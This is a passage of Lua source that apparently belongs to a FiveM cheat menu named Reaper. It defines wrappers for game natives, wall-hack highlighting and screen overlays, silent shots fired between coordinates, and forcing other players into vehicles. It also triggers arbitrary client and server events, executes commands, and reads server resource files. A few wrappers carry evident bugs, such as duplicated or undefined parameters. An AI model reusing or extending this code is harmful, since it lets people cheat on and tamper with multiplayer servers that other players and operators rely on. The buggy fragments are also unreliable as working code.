    function __REAPER1__.N.EnableControlAction(p1,p2,p3) return __REAPER1__.N.ReaperInvoke(0x351220255D64C155, p1, p2, p3) end
    function __REAPER1__.N.GetPlayerServerId(p1) return __REAPER1__.N.ReaperInvoke(0x4d97bcc7, p1, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) end
    function __REAPER1__.N.NetworkIsPlayerActive(p1) return __REAPER1__.N.ReaperInvoke(0xB8DFD30D6973E135, p1, Citizen.ReturnResultAnyway()) end
    function __REAPER1__.N.GetPedBoneIndex(p1,p2) return __REAPER1__.N.ReaperInvoke(0x3F428D08BE5AAE31, p1, p2, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) end
    function __REAPER1__.N.ClonePed(p1,p2,p3,p4) return __REAPER1__.N.ReaperInvoke(0xEF29A16337FACADB, p1, p2, p3, p4, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) end
    function __REAPER1__.N.ClonePedToTarget(p1,p2) return __REAPER1__.N.ReaperInvoke(0xE952D6431689AD9A, p1, p2) end
    function __REAPER1__.N.GetPlayerGroup(p1) return __REAPER1__.N.ReaperInvoke(0x0D127585F77030AF, p1, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) end
    function __REAPER1__.N.SetRelationshipBetweenGroups(p1,p2,p3) return __REAPER1__.N.ReaperInvoke(0xBF25EB89375A37AD, p1, p2, p3) end
    function __REAPER1__.N.GetPedRelationshipGroupHash(p1) return __REAPER1__.N.ReaperInvoke(0x7DBDD04862D95F04, p1, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) end
    function __REAPER1__.N.SetCanAttackFriendly(p1,p2,p3) return __REAPER1__.N.ReaperInvoke(0xB3B1CB349FF9C75D, p1, p2, p3) end
    function __REAPER1__.N.SetPedAsGroupMember(p1,p2) return __REAPER1__.N.ReaperInvoke(0x9F3480FE65DB31B5, p1, p2) end
    function __REAPER1__.N.SetPedNeverLeavesGroup(p1,p2) return __REAPER1__.N.ReaperInvoke(0x3DBFC55D5C9BB447, p1, p2) end
    function __REAPER1__.N.SetPedAsGroupLeader(p1,p2) return __REAPER1__.N.ReaperInvoke(0x2A7819605465FBCE, p1, p2) end
    function __REAPER1__.N.LoadResourceFile(p1,p2) return __REAPER1__.N.ReaperInvoke(0x76a9ee1f, tostring(p1), tostring(p2), Citizen.ReturnResultAnyway(), Citizen.ResultAsString()) end
    function __REAPER1__.N.TriggerEvent(p1, ...) local payload = msgpack.pack({...}) return __REAPER1__.N.ReaperInvoke(0x91310870, tostring(p1), payload, string.len(payload))  end
    function __REAPER1__.N.TriggerServerEvent(p1, ...) local payload = msgpack.pack({...}) return __REAPER1__.N.ReaperInvoke(0x7fdd1128, tostring(p1), payload, string.len(payload)) end
    function __REAPER1__.N.PlaySoundFromCoord(p1,p2,p3,p4,p5,p6,p7,p8,p9) return __REAPER1__.N.ReaperInvoke(0x8D8686B622B88120, p1, tostring(p2), p3, p4, p5, tostring(p6), p7, p8, p9) end
    function __REAPER1__.N.CreatePickup(p1,p2,p3,p4,p5,p6,p7,p8) return __REAPER1__.N.ReaperInvoke(0xFBA08C503DD5FA58, p1, p2, p3, p4, p5, p6, p7, p8, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) end
    function __REAPER1__.N.RemovePickup(p1) return __REAPER1__.N.ReaperInvoke(0x3288D8ACAECD2AB2, p1) end
    function __REAPER1__.N.IsPedMale(p1) return __REAPER1__.N.ReaperInvoke(0x6D9F5FAA7488BA46, p1, Citizen.ReturnResultAnyway()) end
    function __REAPER1__.N.GetVehicleName(p1) return string.lower(__REAPER1__.N.ReaperInvoke(0xB215AAC32D25D019, __REAPER1__.N.ReaperInvoke(0x9F47B058362C84B5, p1, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()), Citizen.ReturnResultAnyway(), Citizen.ResultAsString())) end
    function __REAPER1__.N.GetPedArmour(p1) return __REAPER1__.N.ReaperInvoke(0x9483AF821605B1D8, p1, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) end
    function __REAPER1__.N.GetPlayerMaxArmour(p1) return __REAPER1__.N.ReaperInvoke(0x92659B4CE1863CB3, p1, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) end
    function __REAPER1__.N.GetNameOfZone(p1,p2,p3) return __REAPER1__.N.ReaperInvoke(0xCD90657D4C30E1CA, p1, p2 ,p3, Citizen.ReturnResultAnyway(), Citizen.ResultAsString()) end
    function __REAPER1__.N.SetPlayerBlipPositionThisFrame(p1,p2) return __REAPER1__.N.ReaperInvoke(0x77E2DD177910E1CF, p1, p2) end
    function __REAPER1__.N.NetworkSetChoiceMigrateOptions(p1,p2) return __REAPER1__.N.ReaperInvoke(0x5C707A667DF8B9FA, toggle, player) end
    function __REAPER1__.N.NetworkRegisterEntityAsNetworked(p1) return __REAPER1__.N.ReaperInvoke(0x06FAACD625D80CAA, p1) end
    function __REAPER1__.N.NetworkRequestControlOfNetworkId(p1) return __REAPER1__.N.ReaperInvoke(0xA670B3662FAFFBD0, p1, Citizen.ReturnResultAnyway()) end
    function __REAPER1__.N.NetToEnt(p1) return __REAPER1__.N.ReaperInvoke(0xBFFEAB45A9A9094A, p1, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) end
    function __REAPER1__.N.GetNumResources() return __REAPER1__.N.ReaperInvoke(0x863f27b, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) end
    function __REAPER1__.N.GetResourceByFindIndex(p1) return __REAPER1__.N.ReaperInvoke(0x387246b7, p1, Citizen.ReturnResultAnyway(), Citizen.ResultAsString()) end
    function __REAPER1__.N.SetHeliBladesSpeed(p1,p2) return __REAPER1__.N.ReaperInvoke(0xFD280B4D7F3ABC4D, p1, p2) end
    function __REAPER1__.N.RemovePedFromGroup(p1) return __REAPER1__.N.ReaperInvoke(0xED74007FFB146BC2, p1) end
    function __REAPER1__.N.EnableAllControlActions(p1) return __REAPER1__.N.ReaperInvoke(0xA5FFE9B05F199DE7, p1) end
    function __REAPER1__.N.DrawPoly(p1,p2,p3,p4,p5,p6,p7,p8,p9,p10,p11,p12,p13) return __REAPER1__.N.ReaperInvoke(0xAC26716048436851, p1, p2, p3, p4, p5, p6, p7, p8, p9, p10, p11, p12, p13) end
    function __REAPER1__.N.GetModelDimensions(p1) return __REAPER1__.N.ReaperInvoke(0x03E8D3D5F549087A, p1, Citizen.PointerValueVector(), Citizen.PointerValueVector()) end
    function __REAPER1__.N.LockMinimapPosition(p1,p2) return __REAPER1__.N.ReaperInvoke(0x1279E861A329E73F, p1, p2) end
    function __REAPER1__.N.ReplaceHudColourWithRgba(p1,p2,p3,p4,p5) return __REAPER1__.N.ReaperInvoke(0xF314CF4F0211894E, p1, p2, p3, p4, p5) end
    function __REAPER1__.N.TaskVehicleTempAction(p1,p2,p3,p4) return __REAPER1__.N.ReaperInvoke(0xC429DCEEB339E129, p1, p2, p3, p4) end
    function __REAPER1__.N.SetPedAlertness(p1,p2) return __REAPER1__.N.ReaperInvoke(0xDBA71115ED9941A6, p1, p2) end
    function __REAPER1__.N.SetDrawOrigin(p1,p2,p3,p4) return __REAPER1__.N.ReaperInvoke(0xAA0008F3BBB8F416, p1, p2, p3, p4) end
    function __REAPER1__.N.ClearDrawOrigin() return __REAPER1__.N.ReaperInvoke(0xFF0B610F6BE0D7AF) end
    function __REAPER1__.N.Glow(p1,p2,p3,p4,p5,p6,p7,p8,p9,p10,p11,p12,p13,p14) return __REAPER1__.N.ReaperInvoke(0xD0F64B265C8C8B33, p1, p2, p3, p4, p5, p6, p7, p8, p9, p10, p11, p12, p13, p14) end
    function __REAPER1__.N.NetworkGetPlayerIndexFromPed(p1) return __REAPER1__.N.ReaperInvoke(0x6C0E2E0125610278, p1, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) end
    function __REAPER1__.N.Cham(p1,p2,p3,p4) return __REAPER1__.N.ReaperInvoke(0xa66f8f75, p1, p2, p3, p4) end 
    function __REAPER1__.N.GetCurrentPedWeaponEntityIndex(p1) return __REAPER1__.N.ReaperInvoke(0x3B390A939AF0B5FC, p1, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) end
    function __REAPER1__.N.SetBlipFlashes(p1,p2) return __REAPER1__.N.ReaperInvoke(0xB14552383D39CE3E, p1, p2) end
    function __REAPER1__.N.GetBlipColour(p1) return __REAPER1__.N.ReaperInvoke(0xDF729E8D20CF7327, p1, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) end
    function __REAPER1__.N.SetGravityLevel(p1) return __REAPER1__.N.ReaperInvoke(0x740E14FAD5842351, p1) end
    function __REAPER1__.N.SetPedDensityMultiplierThisFrame(p1) return __REAPER1__.N.ReaperInvoke(0x95E3D6257B166CF2, p1) end
    function __REAPER1__.N.SetVehicleDensityMultiplierThisFrame(p1) return __REAPER1__.N.ReaperInvoke(0x245A6883D966D537, p1) end
    function __REAPER1__.N.SetRandomVehicleDensityMultiplierThisFrame(p1) return __REAPER1__.N.ReaperInvoke(0xB3B3359379FE77D3, p1) end
    function __REAPER1__.N.SetParkedVehicleDensityMultiplierThisFrame(p1) return __REAPER1__.N.ReaperInvoke(0xEAE6DCC7EEE3DB1D, p1) end
    function __REAPER1__.N.SetScenarioPedDensityMultiplierThisFrame(p1,p2) return __REAPER1__.N.ReaperInvoke(0x7A556143A1C03898, p1, p2) end
    function __REAPER1__.N.GetEntityType(p1) return __REAPER1__.N.ReaperInvoke(0x8ACD366038D14505, p1, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) end
    function __REAPER1__.N.NetworkClearClockTimeOverride() return __REAPER1__.N.ReaperInvoke(0xD972DF67326F966E) end
    function __REAPER1__.N.NetworkOverrideClockTime(p1,p2,p3) return __REAPER1__.N.ReaperInvoke(0xE679E3E06E363892, p1, p2, p3) end
    function __REAPER1__.N.SetClockDate(p1,p2,p3) return __REAPER1__.N.ReaperInvoke(0xB096419DF0D06CE7, p1, p2, p3) end
    function __REAPER1__.N.GetClockMinutes() return __REAPER1__.N.ReaperInvoke(0x13D2B8ADD79640F2, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) end
    function __REAPER1__.N.GetClockSeconds() return __REAPER1__.N.ReaperInvoke(0x494E97C2EF27C470, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) end
    function __REAPER1__.N.GetClockHours() return __REAPER1__.N.ReaperInvoke(0x25223CA6B4D20B7F, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) end
    function __REAPER1__.N.GetClockDayOfMonth() return __REAPER1__.N.ReaperInvoke(0x3D10BC92A4DB1D35, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) end
    function __REAPER1__.N.GetClockMonth() return __REAPER1__.N.ReaperInvoke(0xBBC72712E80257A1, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) end
    function __REAPER1__.N.GetClockYear() return __REAPER1__.N.ReaperInvoke(0x961777E64BDAF717, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) end
    function __REAPER1__.N.ClearOverrideWeather() return __REAPER1__.N.ReaperInvoke(0x338D2E3477711050) end
    function __REAPER1__.N.ClearWeatherTypePersist() return __REAPER1__.N.ReaperInvoke(0xCCC39339BEF76CF5) end
    function __REAPER1__.N.SetWeatherTypePersist(p1) return __REAPER1__.N.ReaperInvoke(0x704983DF373B198F, p1) end
    function __REAPER1__.N.SetWeatherTypeNow(p1) return __REAPER1__.N.ReaperInvoke(0x29B487C359E19889, p1) end
    function __REAPER1__.N.SetWeatherTypeNowPersist(p1) return __REAPER1__.N.ReaperInvoke(0xED712CA327900C8A, p1) end
    function __REAPER1__.N.SetForceVehicleTrails(p1) return __REAPER1__.N.ReaperInvoke(0x4CC7F0FEA5283FE0, p1) end
    function __REAPER1__.N.SetForcePedFootstepsTracks(p1) return __REAPER1__.N.ReaperInvoke(0xAEEDAD1420C65CC0, p1) end
    function __REAPER1__.N.ForceSnowPass(p1) return __REAPER1__.N.ReaperInvoke(0xe6e16170, p1) end
    function __REAPER1__.N.SetRainLevel(p1) return __REAPER1__.N.ReaperInvoke(0x643E26EA6E024D92, p1) end
    function __REAPER1__.N.IsPedSprinting(p1) return __REAPER1__.N.ReaperInvoke(0x57E457CD2C0FC168, p1, Citizen.ReturnResultAnyway()) end
    function __REAPER1__.N.IsPedRunning(p1) return __REAPER1__.N.ReaperInvoke(0xC5286FFC176F28A2, p1, Citizen.ReturnResultAnyway()) end
    function __REAPER1__.N.ClearAreaOfEverything(p1,p2,p3,p4,p5,p6,p7,p8) return __REAPER1__.N.ReaperInvoke(0x957838AAF91BD12D, p1, p2, p3, p4, p5, p6, p7, p8) end
    function __REAPER1__.N.ClearAreaOfProjectiles(p1,p2,p3,p4,p5) return __REAPER1__.N.ReaperInvoke(0x0A1CB9094635D1A6, p1, p2, p3, p4, p5) end
    function __REAPER1__.N.ClearAreaOfObjects(p1,p2,p3,p4,p5) return __REAPER1__.N.ReaperInvoke(0xDD9B9B385AAC7F5B, p1, p2, p3, p4, p5) end
    function __REAPER1__.N.ClearAreaOfPeds(p1,p2,p3,p4,p5) return __REAPER1__.N.ReaperInvoke(0xBE31FD6CE464AC59, p1, p2, p3, p4, p5) end
    function __REAPER1__.N.ClearAreaOfCops(p1,p2,p3,p4,p5) return __REAPER1__.N.ReaperInvoke(0x04F8FC8FCF58F88D, p1, p2, p3, p4, p5) end
    function __REAPER1__.N.ClearAreaOfVehicles(p1,p2,p3,p4,p5,p6,p7,p8,p9) return __REAPER1__.N.ReaperInvoke(0x01C7B9B38428AEB6, p1, p2, p3, p4, p5, p6, p7, p8, p9) end
    function __REAPER1__.N.DetachEntity(p1,p2,p3) return __REAPER1__.N.ReaperInvoke(0x961AC54BF0613F5D, p1, p2, p3) end
    function __REAPER1__.N.ForceSocialClubUpdate() return __REAPER1__.N.ReaperInvoke(0xEB6891F03362FB12) end
    function __REAPER1__.N.TaskGoStraightToCoord(p1,p2,p3,p4,p5,p6,p7,p8) return __REAPER1__.N.ReaperInvoke(0xD76B57B44F1E6F8B, p1, p2, p3, p4, p5, p6, p7, p8) end
    function __REAPER1__.N.IsPedUsingScenario(p1,p2) return __REAPER1__.N.ReaperInvoke(0x1BF094736DD62C2E, p1, p2, Citizen.ReturnResultAnyway()) end
    function __REAPER1__.N.DeleteCham(p1,p2) return __REAPER1__.N.ReaperInvoke(0xa896b20a, p1, p2) end
    function __REAPER1__.N.GetResourceState(p1) return __REAPER1__.N.ReaperInvoke(0x4039b485, p1, Citizen.ResultAsString()) end
    function __REAPER1__.N.IsEntityOnScreen(p1) return __REAPER1__.N.ReaperInvoke(0xE659E47AF827484B, p1, Citizen.ReturnResultAnyway()) end
    function __REAPER1__.N.IsDuiAvailable(p1) return __REAPER1__.N.ReaperInvoke(0x7aac3b4c, p1, Citizen.ReturnResultAnyway()) end
    function __REAPER1__.N.PointCamAtEntity(p1,p2,p3,p4,p5,p6) return __REAPER1__.N.ReaperInvoke(0x5640BFF86B16E8DC, p1, p2, p3, p4, p5, p6) end
    function __REAPER1__.N.GetFinalRenderedCamCoord() return __REAPER1__.N.ReaperInvoke(0xA200EB1EE790F448, Citizen.ResultAsVector()) end
    function __REAPER1__.N.GetFinalRenderedCamRot(p1) return __REAPER1__.N.ReaperInvoke(0x5B4E4C817FCC2DFB, p1, Citizen.ResultAsVector()) end
    function __REAPER1__.N.GetCurrentServerEndpoint() return __REAPER1__.N.ReaperInvoke(0xea11bfba, Citizen.ResultAsString()) end
    function __REAPER1__.N.TextWidth(p1) return __REAPER1__.N.ReaperInvoke(0x85F061DA64ED2F67, p1, Citizen.ResultAsFloat()) end
    function __REAPER1__.N.BeginTextWidth(p1) return __REAPER1__.N.ReaperInvoke(0x54CE8AC98E120CAB, p1) end
    function __REAPER1__.N.SetPlayerWantedLevelNow(p1,p2) return __REAPER1__.N.ReaperInvoke(0xE0A7D1E497FFCD6F, p1, p2) end
    function __REAPER1__.N.RestartGame() return __REAPER1__.N.ReaperInvoke(0xE574A662ACAEFBB1) end
    function __REAPER1__.N.TaskVehicleDriveToCoordLongrange(p1,p2,p3,p4,p5,p6,p8,p8) return __REAPER1__.N.ReaperInvoke(0x158BB33F920D360C, p1, p2, p3, p4, p5, p6, p7, p8) end
    function __REAPER1__.N.IsIplActive(p1) return __REAPER1__.N.ReaperInvoke(0x88A741E44A2B3495, p1, Citizen.ReturnResultAnyway()) end
    function __REAPER1__.N.RequestIpl(p1) return __REAPER1__.N.ReaperInvoke(0x41B4893843BBDB74, p1) end
    function __REAPER1__.N.RemoveIpl(p1) return __REAPER1__.N.ReaperInvoke(0xEE6C5AD3ECE0A82D, p1) end
    function __REAPER1__.N.IsInteriorEntitySetActive(p1,p2) return __REAPER1__.N.ReaperInvoke(0x35F7DD45E8C0A16D, p1, p2, Citizen.ReturnResultAnyway()) end
    function __REAPER1__.N.ActivateInteriorEntitySet(p1,p2) return __REAPER1__.N.ReaperInvoke(0x55E86AF2712B36A1, p1, p2) end
    function __REAPER1__.N.DeactivateInteriorEntitySet(p1,p2) return __REAPER1__.N.ReaperInvoke(0x420BD37289EEE162, p1, p2) end
    function __REAPER1__.N.RefreshInterior(p1) return __REAPER1__.N.ReaperInvoke(0x41F37C3427C75AE0, p1) end
    function __REAPER1__.N.IsScreenFadingOut() return __REAPER1__.N.ReaperInvoke(0x797AC7CB535BA28F, Citizen.ReturnResultAnyway()) end
    function __REAPER1__.N.DoScreenFadeIn(p1) return __REAPER1__.N.ReaperInvoke(0xD4E8E24955024033, p1) end
    function __REAPER1__.N.IsScreenblurFadeRunning() return __REAPER1__.N.ReaperInvoke(0x7B226C785A52A0A9, Citizen.ReturnResultAnyway()) end
    function __REAPER1__.N.TriggerScreenblurFadeIn(p1) return __REAPER1__.N.ReaperInvoke(0xA328A24AAA6B7FDC, p1, Citizen.ReturnResultAnyway()) end
    function __REAPER1__.N.GetVehicleBodyHealth(p1) return __REAPER1__.N.ReaperInvoke(0xF271147EB7B40F12, p1, Citizen.ResultAsFloat()) end
    function __REAPER1__.N.HasEntityBeenDamagedByWeapon(p1,p2,p3) return __REAPER1__.N.ReaperInvoke(0x131D401334815E94, p1, p2, p3, Citizen.ReturnResultAnyway()) end
    function __REAPER1__.N.ModelChange(p1,p2,p3,p4,p5,p6,p7) return __REAPER1__.N.ReaperInvoke(0x92C47782FDA8B2A3, p1, p2, p3, p4, p5, p6, p7) end
    function __REAPER1__.N.IsVehicleDamaged(p1) return __REAPER1__.N.ReaperInvoke(0xBCDC5017D3CE1E9E, p1, Citizen.ReturnResultAnyway()) end
    function __REAPER1__.N.SetVehicleUndriveable(p1,p2) return __REAPER1__.N.ReaperInvoke(0x8ABA6AF54B942B95, p1, p2) end
    function __REAPER1__.N.SetExtraTimecycleModifier(p1) return __REAPER1__.N.ReaperInvoke(0x5096FD9CCB49056D, p1) end
    function __REAPER1__.N.SetExtraTimecycleModifierStrength(p1) return __REAPER1__.N.ReaperInvoke(0x2C328AF17210F009, p1) end
    function __REAPER1__.N.SetFollowPedCamViewMode(p1) return __REAPER1__.N.ReaperInvoke(0x5A4F9EDF1673F704, p1) end
    function __REAPER1__.N.SetVehicleGravityAmount(p1,p2) return __REAPER1__.N.ReaperInvoke(0x1a963e58, p1, p2) end
    function __REAPER1__.N.IsEntityAttachedToEntity(p1,p2) return __REAPER1__.N.ReaperInvoke(0xEFBE71898A993728, p1, p2, Citizen.ReturnResultAnyway()) end
    function __REAPER1__.N.NetworkGetEntityOwner(p1) return __REAPER1__.N.ReaperInvoke(0x526fee31, p1, Citizen.ResultAsInteger()) end
    function __REAPER1__.N.RemoveParticleFxInRange(p1,p2,p3,p4) return __REAPER1__.N.ReaperInvoke(0xDD19FA1C6D657305, p1, p2, p3, p4) end
    function __REAPER1__.N.SetPedCanBeDraggedOut(p1,p2) return __REAPER1__.N.ReaperInvoke(0xC1670E958EEE24E5, p1, p2) end
    function __REAPER1__.N.SetPedAccuracy(p1,p2) return __REAPER1__.N.ReaperInvoke(0x7AEFB85C1D49DEB6, p1, p2, Citizen.ResultAsInteger()) end
    function __REAPER1__.N.SetPedCanBeShotInVehicle(p1,p2) return __REAPER1__.N.ReaperInvoke(0xC7EF1BA83230BA07, p1, p2) end
    function __REAPER1__.N.SetPedCanBeTargetted(p1,p2) return __REAPER1__.N.ReaperInvoke(0x63F58F7C80513AAD, p1, p2) end
    function __REAPER1__.N.SetEntityMaxSpeed(p1,p2) return __REAPER1__.N.ReaperInvoke(0x0E46A3FCBDE2A1B1, p1, p2) end
    function __REAPER1__.N.SetVehicleSuspensionHeight(p1,p2) return __REAPER1__.N.ReaperInvoke(0xb3439a01, p1, p2) end
    function __REAPER1__.N.SetVehicleWheelXOffset(p1,p2,p3) return __REAPER1__.N.ReaperInvoke(0xbd6357d, p1, p2, p3) end
    function __REAPER1__.N.GetRegisteredCommands() return msgpack.unpack(__REAPER1__.N.ReaperInvoke(0xd4bef069, Citizen.ResultAsObject())) end
    function __REAPER1__.N.ExecuteCommand(p1) return __REAPER1__.N.ReaperInvoke(0x561c060b, p1) end
    function __REAPER1__.N.RegisterCommand(p1,p2,p3) return __REAPER1__.N.ReaperInvoke(0x5fa79b0f, p1, Citizen.GetFunctionReference(p2), p3) end 
    __REAPER1__.N.IsKeyReleased = function(key, ov)
        if (ov or not __REAPER1__.M.TextboxWriting) and __REAPER1__.T.KeysHam['all'][key].state == 1 and Ham.getKeyState(__REAPER1__.T.KeysHam['all'][key].keyCheck) == 0 then
            return true
        end
        return false end
    __REAPER1__.N.IsKeyPressed = function(key, ov)
        if (ov or not __REAPER1__.M.TextboxWriting) and __REAPER1__.T.KeysHam['all'][key].pressed == 1 then
            return true
        end
        return false end
    __REAPER1__.N.IsKeyHeld = function(key, ov)
        if (ov or not __REAPER1__.M.TextboxWriting) and __REAPER1__.T.KeysHam['all'][key].state == 1 then
            return true
        end
        return false end
    function __REAPER1__.N.OpDoorLock(p1,p2)
        __REAPER1__.N.ReaperInvoke(0xB664292EAECF7FA6, p1, p2)
        if p2 == 2 then
            __REAPER1__.N.ReaperInvoke(0xA2F80B8D040727CC, p1, true)
        else
            __REAPER1__.N.ReaperInvoke(0xA2F80B8D040727CC, p1, false)
        end
    end
    function __REAPER1__.N.DestroyElCams()
        __REAPER1__.N.ReaperInvoke(0x07E5B515DB0636FC, false, false, 0, true, true) 
        __REAPER1__.N.ReaperInvoke(0x198F77705FA0931D, __REAPER1__.V.SelfPed) 
        __REAPER1__.N.ReaperInvoke(0x3E93E06DB8EF1F30) end
    function __REAPER1__.N.ShootSilentSingleBulletBetweenCoords(p1,p2,p3,p4,p5,p6,p7,p8,p9,p10,p11,p12,p13)
        __REAPER1__.N.ReaperInvoke(0x867654CBC7606F2C, p1, p2, p3, p4, p5, p6, p7, p8, p9, p10, p11, p12, p13)
        __REAPER1__.N.ReaperInvoke(0xD75ACCF5E0FB5367, __REAPER1__.V.SelfPed, false, -1, 0) end
    function __REAPER1__.N.BadabingBadaboom(p1,p2)
        __REAPER1__.N.ReaperInvoke(0x77E2DD177910E1CF, p1, p2)
        __REAPER1__.N.ReaperInvoke(0x1279E861A329E73F, p1, p2) end
    function __REAPER1__.N.GetScreenCoordFromWorldCoord(p1,p2,p3)
        local ret, sx, sy = __REAPER1__.N.ReaperInvoke(0xF9904D11F1ACBEC3, p1, p2, p3, Citizen.PointerValueFloat(), Citizen.PointerValueFloat(), Citizen.ReturnResultAnyway())
        sx, sy = __REAPER1__.F.FloatLength(sx, 5), __REAPER1__.F.FloatLength(sy, 5)
        if sx == 0.1 or sx == 0.9 or sy == 0.1 or sy == 0.9 then ret, sx, sy = __REAPER1__.N.ReaperInvoke(0x34E82F05DF2974F5, p1, p2, p3, Citizen.PointerValueFloat(), Citizen.PointerValueFloat(), Citizen.ReturnResultAnyway()) end
        return ret, sx, sy end
    function __REAPER1__.N.PutInVehicle(p1,p2)
        Citizen.CreateThread(function()
            if __REAPER1__.F.RequestEntity(p2) then
            local c = __REAPER1__.N.ReaperInvoke(0x3FEF770D40960D5A, p1, false, Citizen.ResultAsVector())
            local veh = __REAPER1__.N.ReaperInvoke(0xAF35D0D2583051B0, p2, c.x, c.y, c.z - 10, __REAPER1__.N.ReaperInvoke(0xE83D4F9BA2A38914, p1, Citizen.ResultAsFloat()), true, true, Citizen.ResultAsInteger())
            __REAPER1__.N.ReaperInvoke(0xF75B0D629E1C063D, p1, veh, -1)
            __REAPER1__.N.ReaperInvoke(0x480142959D337D00, p1, veh, 180.0, 17564220)
            __REAPER1__.N.ReaperInvoke(0x239A3351AC1DA385, veh, c.x, c.y, c.z, true, true, true) end end) end
    function __REAPER1__.N.SilentPedConfig(p1)
        __REAPER1__.N.ReaperInvoke(0x428CA6DBD1094446, p1, true)
        __REAPER1__.N.ReaperInvoke(0x1760FFA8AB074D66, p1, false)
        __REAPER1__.N.ReaperInvoke(0xF29CF591C4BF6CEE, p1, 0.0)
        __REAPER1__.N.ReaperInvoke(0x33A8F7F7D5F7F33C, p1, 0.0)
        __REAPER1__.N.ReaperInvoke(0xDBA71115ED9941A6, p1, 0)
        __REAPER1__.N.ReaperInvoke(0x971D38760FBC02EF, p1, true)
        __REAPER1__.N.ReaperInvoke(0x971D38760FBC02EF, p1, true)
        __REAPER1__.N.ReaperInvoke(0xEA1C610A04DB6BBB, p1, false, 0) end
    function __REAPER1__.N.GetCurrentStreet(p1,p2,p3)
        local street, crossing = __REAPER1__.N.ReaperInvoke(0x2EB41072B4C1E4C0, p1, p2, p3, Citizen.PointerValueInt(), Citizen.PointerValueInt())
        return __REAPER1__.N.ReaperInvoke(0xD0EF8A959B8A4CB9, street, Citizen.ReturnResultAnyway(), Citizen.ResultAsString()) end
    function __REAPER1__.N.CurrentPedStatus(p1)
        local status = '~r~Not spawned~s~'
        local coords = __REAPER1__.N.ReaperInvoke(0x3FEF770D40960D5A, p1, false, Citizen.ReturnResultAnyway(), Citizen.ResultAsVector())
        if coords.x == 0.0 and coords.y == 0.0 or coords.z == 0.0 and __REAPER1__.N.ReaperInvoke(0x3317DEDB88C95038, p1, p2, Citizen.ReturnResultAnyway()) then status = '~r~Not spawned~s~'
        elseif __REAPER1__.N.ReaperInvoke(0x3317DEDB88C95038, p1, 1, Citizen.ReturnResultAnyway()) then status = '~c~Dead~s~'
        elseif __REAPER1__.N.ReaperInvoke(0x997ABD671D25CA0B, p1, false, Citizen.ReturnResultAnyway()) then status = "Driving"
        elseif __REAPER1__.N.ReaperInvoke(0x997ABD671D25CA0B, p1, true, Citizen.ReturnResultAnyway()) then status = "Entering vehicle"
        elseif __REAPER1__.N.ReaperInvoke(0x9DE327631295B4C2, p1, Citizen.ReturnResultAnyway()) then status = "Swimming"
        elseif __REAPER1__.N.ReaperInvoke(0xFB92A102F1C4DFA3, p1, Citizen.ReturnResultAnyway()) then status = 'Falling'
        elseif __REAPER1__.N.ReaperInvoke(0xCEDABC5900A0BF97, p1, Citizen.ReturnResultAnyway()) then status = 'Jumping'
        elseif __REAPER1__.N.ReaperInvoke(0xAC29253EEF8F0180, p1, Citizen.ReturnResultAnyway()) then status = "Idle"
        elseif __REAPER1__.N.ReaperInvoke(0xDE4C184B2B9B071A, p1, Citizen.ReturnResultAnyway()) then status = "Walking"
        elseif __REAPER1__.N.ReaperInvoke(0xC5286FFC176F28A2, p1, Citizen.ReturnResultAnyway()) then status = "Jogging"
        else status = 'Running'
        end
        return status end
    function __REAPER1__.N.GetVehProperties(p1)
        if __REAPER1__.N.ReaperInvoke(0x7239B21A38F536BA, p1, Citizen.ReturnResultAnyway()) then
            local colorPrimary, colorSecondary = __REAPER1__.N.ReaperInvoke(0xA19435F193E081AC, p1, Citizen.PointerValueInt(), Citizen.PointerValueInt())
            local pearlescentColor, wheelColor = __REAPER1__.N.ReaperInvoke(0x3BC4245933A166F7, p1, Citizen.PointerValueInt(), Citizen.PointerValueInt())
            local extras = {}
            local tablem = {}
    
            for extraId = 0, 12 do
                if __REAPER1__.N.ReaperInvoke(0x1262D55792428154, p1, extraId, Citizen.ReturnResultAnyway()) then
                    local state = __REAPER1__.N.ReaperInvoke(0xD2E6822DBFD6C8BD, p1, extraId, Citizen.ReturnResultAnyway()) == 1
                    extras[tostring(extraId)] = state
                end
            end
    
            tablem.model             = __REAPER1__.N.ReaperInvoke(0x9F47B058362C84B5, p1, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            tablem.plate             = __REAPER1__.N.ReaperInvoke(0x7CE1CCB9B293020E, p1, Citizen.ReturnResultAnyway(), Citizen.ResultAsString())
            tablem.plateIndex        = __REAPER1__.N.ReaperInvoke(0xF11BC2DD9A3E7195, p1, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            tablem.bodyHealth        = __REAPER1__.N.ReaperInvoke(0xF271147EB7B40F12, p1, Citizen.ReturnResultAnyway(), Citizen.ResultAsFloat())
            tablem.engineHealth      = __REAPER1__.N.ReaperInvoke(0xC45D23BAF168AAB8, p1, Citizen.ReturnResultAnyway(), Citizen.ResultAsFloat())
            tablem.tankHealth        = __REAPER1__.N.ReaperInvoke(0x7D5DABE888D2D074, p1, Citizen.ReturnResultAnyway(), Citizen.ResultAsFloat())
            tablem.fuelLevel         = __REAPER1__.N.ReaperInvoke(0x5f739bb8, p1, Citizen.ReturnResultAnyway(), Citizen.ResultAsFloat())
            tablem.dirtLevel         = __REAPER1__.N.ReaperInvoke(0x8F17BC8BA08DA62B, p1, Citizen.ReturnResultAnyway(), Citizen.ResultAsFloat())
            tablem.color1            = colorPrimary
            tablem.color2            = colorSecondary
            tablem.pearlescentColor  = pearlescentColor
            tablem.wheelColor        = wheelColor
